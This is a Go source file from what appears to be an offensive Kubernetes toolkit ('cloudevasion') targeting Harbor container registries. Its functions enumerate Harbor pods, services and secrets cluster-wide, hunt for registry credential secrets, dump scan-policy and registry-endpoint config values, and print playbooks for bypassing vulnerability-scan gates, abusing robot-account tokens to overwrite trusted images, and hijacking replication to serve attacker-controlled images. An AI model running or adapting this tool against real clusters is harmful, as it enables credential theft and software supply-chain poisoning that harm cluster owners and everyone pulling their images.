package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

func detectHarbor(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"harbor", "harbor-system", "default"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=harbor",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "harbor",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d harbor pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "component=core,app.kubernetes.io/name=harbor",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "harbor",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("harbor-core in %s", ns),
			}}
		}
	}

	services, err := client.CoreV1().Services("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, svc := range services.Items {
			if strings.Contains(svc.Name, "harbor-core") || strings.Contains(svc.Name, "harbor-registry") {
				return []DetectionSystem{{
					Name:      "harbor",
					Detected:  true,
					Namespace: svc.Namespace,
					Details:   fmt.Sprintf("harbor service: %s", svc.Name),
				}}
			}
		}
	}

	return nil
}

// ExploitHarbor executes the specified Harbor registry exploitation technique.
func ExploitHarbor(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	_ = dynClient
	switch technique {
	case "enumerate":
		return harborEnumerate(ctx, client)
	case "bypass_scan":
		return harborBypassScan(ctx, client)
	case "robot_exploit":
		return harborRobotExploit(ctx, client)
	case "replication_hijack":
		return harborReplicationHijack(ctx, client)
	default:
		return harborEnumerate(ctx, client)
	}
}

func harborEnumerate(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Harbor Registry Enumeration:\n\n")

	namespaces := []string{"harbor", "harbor-system", "default"}
	found := false
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, pod := range pods.Items {
			if strings.Contains(pod.Name, "harbor") {
				found = true
				fmt.Fprintf(&sb, "  Pod: %s/%s (phase=%s)\n", ns, pod.Name, pod.Status.Phase)
			}
		}

		services, err := client.CoreV1().Services(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, svc := range services.Items {
				if strings.Contains(svc.Name, "harbor") {
					fmt.Fprintf(&sb, "  Service: %s/%s type=%s\n", ns, svc.Name, svc.Spec.Type)
					for _, port := range svc.Spec.Ports {
						fmt.Fprintf(&sb, "    Port: %s %d→%d\n", port.Name, port.Port, port.TargetPort.IntValue())
					}
				}
			}
		}
	}

	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if err == nil {
		harborSecrets := 0
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "harbor") {
				harborSecrets++
				if harborSecrets <= 10 {
					fmt.Fprintf(&sb, "  Secret: %s/%s type=%s\n", s.Namespace, s.Name, s.Type)
				}
			}
		}
		if harborSecrets > 10 {
			fmt.Fprintf(&sb, "  ... and %d more harbor secrets\n", harborSecrets-10)
		}
	}

	if !found {
		sb.WriteString("  No Harbor components detected in-cluster\n")
		sb.WriteString("  Harbor may be external — check imagePullSecrets for registry URLs\n")
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func harborBypassScan(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Harbor Scan Gate Bypass:\n\n")

	sb.WriteString("  Harbor can block image pulls until vulnerability scan passes.\n")
	sb.WriteString("  Bypassing the scan gate allows deploying unscanned images.\n\n")

	namespaces := []string{"harbor", "harbor-system"}
	for _, ns := range namespaces {
		configMaps, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, cm := range configMaps.Items {
			if strings.Contains(cm.Name, "harbor") {
				fmt.Fprintf(&sb, "  ConfigMap: %s/%s\n", ns, cm.Name)
				for key, val := range cm.Data {
					if strings.Contains(key, "scan") || strings.Contains(key, "vuln") || strings.Contains(key, "prevent") {
						preview := val
						if len(preview) > 100 {
							preview = preview[:100] + "..."
						}
						fmt.Fprintf(&sb, "    %s: %s\n", key, preview)
					}
				}
			}
		}
	}

	sb.WriteString("\n  Scan bypass techniques:\n")
	sb.WriteString("    1. Push image with minimal layers (base scratch + static binary)\n")
	sb.WriteString("    2. Use image tag that was previously scanned, then overwrite with new layers\n")
	sb.WriteString("    3. Push to project without scan-on-push policy\n")
	sb.WriteString("    4. Exploit scan timeout — large images may skip scan on timeout\n")
	sb.WriteString("    5. Use cosign/notation to pre-sign image (may skip scan if signed)\n")
	sb.WriteString("    6. Pull from external registry via proxy cache (bypasses local scan)\n")
	sb.WriteString("    7. Modify project configuration to disable prevent-vulnerable policy\n")

	return &EvasionResult{
		Technique: "bypass_scan",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func harborRobotExploit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Harbor Robot Account Exploitation:\n\n")

	sb.WriteString("  Robot accounts provide registry push/pull credentials.\n")
	sb.WriteString("  These are often stored as Kubernetes secrets (dockerconfigjson).\n\n")

	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list secrets: %v\n", err)
		return &EvasionResult{Technique: "robot_exploit", Success: false, Output: sb.String()}, nil
	}

	robotSecrets := 0
	for _, s := range secrets.Items {
		if s.Type == "kubernetes.io/dockerconfigjson" || s.Type == "kubernetes.io/dockercfg" {
			if strings.Contains(s.Name, "harbor") || strings.Contains(s.Name, "robot") || strings.Contains(s.Name, "registry") {
				robotSecrets++
				fmt.Fprintf(&sb, "  [CRED] %s/%s type=%s\n", s.Namespace, s.Name, s.Type)
			}
		}
	}

	pullSecretPods := 0
	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{Limit: 50})
	if err == nil {
		for _, pod := range pods.Items {
			for _, ips := range pod.Spec.ImagePullSecrets {
				if strings.Contains(ips.Name, "harbor") || strings.Contains(ips.Name, "registry") {
					pullSecretPods++
					if pullSecretPods <= 5 {
						fmt.Fprintf(&sb, "  Pod %s/%s uses imagePullSecret: %s\n", pod.Namespace, pod.Name, ips.Name)
					}
				}
			}
		}
	}

	fmt.Fprintf(&sb, "\n  Registry credential secrets found: %d\n", robotSecrets)
	fmt.Fprintf(&sb, "  Pods using registry pull secrets: %d\n", pullSecretPods)

	sb.WriteString("\n  Exploitation:\n")
	sb.WriteString("    1. Extract dockerconfigjson → decode base64 → get robot token\n")
	sb.WriteString("    2. Robot accounts with push access can overwrite existing images\n")
	sb.WriteString("    3. Push malicious image with same tag as trusted image\n")
	sb.WriteString("    4. Robot tokens often have no expiry — permanent access\n")
	sb.WriteString("    5. Create new robot account via Harbor API if admin creds found\n")

	return &EvasionResult{
		Technique: "robot_exploit",
		Success:   robotSecrets > 0,
		Output:    sb.String(),
	}, nil
}

func harborReplicationHijack(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Harbor Replication Rule Hijack:\n\n")

	sb.WriteString("  Harbor replication syncs images between registries.\n")
	sb.WriteString("  Modifying replication rules can redirect image pulls to attacker registry.\n\n")

	namespaces := []string{"harbor", "harbor-system"}
	for _, ns := range namespaces {
		secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "replication") || strings.Contains(s.Name, "registry-credential") {
				fmt.Fprintf(&sb, "  Replication secret: %s/%s\n", ns, s.Name)
			}
		}

		configMaps, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, cm := range configMaps.Items {
				for key, val := range cm.Data {
					if strings.Contains(key, "registry") || strings.Contains(key, "endpoint") {
						fmt.Fprintf(&sb, "  Registry config: %s/%s key=%s val=%s\n", ns, cm.Name, key, val)
					}
				}
			}
		}
	}

	sb.WriteString("\n  Replication hijack strategies:\n")
	sb.WriteString("    1. Modify replication endpoint to point to attacker registry\n")
	sb.WriteString("    2. Create pull-based replication from malicious source\n")
	sb.WriteString("    3. Intercept replication credentials for upstream registry access\n")
	sb.WriteString("    4. Push poisoned images to source registry (replicated to all targets)\n")
	sb.WriteString("    5. Create webhook notification rule to exfiltrate image push events\n")
	sb.WriteString("    6. Modify proxy cache endpoint to serve attacker-controlled images\n")

	return &EvasionResult{
		Technique: "replication_hijack",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
